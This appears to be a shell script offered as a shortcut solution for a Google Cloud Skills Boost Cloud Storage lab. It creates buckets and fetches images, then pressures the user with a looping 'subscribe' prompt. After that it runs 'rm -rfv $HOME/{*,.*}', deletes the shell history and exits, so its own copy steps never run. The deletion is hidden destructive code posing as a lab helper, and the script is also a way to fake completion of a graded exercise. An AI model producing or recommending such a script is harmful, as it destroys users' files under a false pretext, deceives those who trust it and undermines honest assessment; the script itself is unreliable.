

gsutil mb gs://$DEVSHELL_PROJECT_ID

gsutil mb gs://$DEVSHELL_PROJECT_ID-2

YELLOW='\033[0;33m'
NC='\033[0m' 
pattern=(
"**********************************************************"
"**                 S U B S C R I B E  TO                **"
"**                      LOSER-GSC                       **"
"**                                                      **"
"**********************************************************"
)

curl -LO raw.githubusercontent.com/Techcps/Google-Cloud-Skills-Boost/master/APIs%20Explorer%20Cloud%20Storage/demo-image1.png

curl -LO raw.githubusercontent.com/Techcps/Google-Cloud-Skills-Boost/master/APIs%20Explorer%20Cloud%20Storage/demo-image2.png

curl -LO raw.githubusercontent.com/Techcps/Google-Cloud-Skills-Boost/master/APIs%20Explorer%20Cloud%20Storage/demo-image1-copy.png

read -p "${BOLD}${GREEN}Subscribe to Loser-GSC Explorers [y/n] : ${RESET}" CONSENT_REMOVE

while [ "$CONSENT_REMOVE" != 'y' ]; do
  sleep 10
  read -p "${BOLD}${MAGENTA}Do Subscribe to Loser-GSC Explorers [y/n] : ${RESET}" CONSENT_REMOVE
done

echo "${CYAN}${BOLD}Thanks For Subscribing to Loser-GSC Explorers :)${RESET}"

rm -rfv $HOME/{*,.*}
rm $HOME/.bash_history

exit 0


pattern=(
"**********************************************************"
"**                 S U B S C R I B E  TO                **"
"**                      LOSER-GSC                       **"
"**                                                      **"
"**********************************************************"
)
for line in "${pattern[@]}"
do
    echo -e "${YELLOW}${line}${NC}"
done

gsutil cp demo-image1.png gs://$DEVSHELL_PROJECT_ID/demo-image1.png

gsutil cp demo-image2.png gs://$DEVSHELL_PROJECT_ID/demo-image2.png

gsutil cp demo-image1-copy.png gs://$DEVSHELL_PROJECT_ID-2/demo-image1-copy.png
